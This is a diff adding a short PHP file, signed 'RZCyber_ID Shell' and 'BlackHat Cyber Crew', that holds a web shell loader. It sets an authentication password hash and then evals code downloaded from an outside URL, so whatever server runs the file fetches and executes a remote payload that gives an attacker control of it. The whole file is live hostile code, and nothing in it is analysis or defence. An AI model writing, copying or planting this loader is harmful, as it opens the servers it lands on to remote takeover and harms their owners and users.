@@ -1,0 +1,7 @@
+<?php
+// ./RZCyber_ID Shell
+// BlackHat Cyber Crew
+// Mini Size but Many Features!
+$auth_pass = "a6f97f555a708b6d6ae59e5c8dfc910f"; // ./RZCyber_ID
+eval("?>".file_get_contents("https://sck.pm/k8W"));
+?>
